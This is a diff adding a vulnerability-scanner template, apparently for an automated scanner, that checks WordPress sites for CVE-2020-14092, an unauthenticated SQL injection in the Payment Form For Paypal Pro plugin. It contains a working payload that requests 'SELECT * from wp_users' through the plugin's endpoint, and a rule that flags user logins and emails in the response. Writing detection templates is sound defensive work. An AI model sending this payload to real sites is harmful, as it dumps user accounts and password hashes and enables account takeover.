@@ -1,0 +1,23 @@
+id: CVE-2020-14092
+
+info:
+  name: WordPress Payment Form For Paypal Pro <1.1.65 - Unauthenticated SQL Injection
+  severity: Critical
+  tech: WordPress
+
+variables:
+  - vuln: |
+      /?cffaction=get_data_from_database&query=SELECT%20*%20from%20wp_users
+
+requests:
+  - method: GET
+    url: >-
+      {{.root}}{{.endpoint}}
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+    detections:
+      - >-
+        StatusCode() == 200 && StringSearch("resBody", "user_login") && StringSearch("resBody", "user_email")
+
+references:
+  - https://wpscan.com/vulnerability/10287
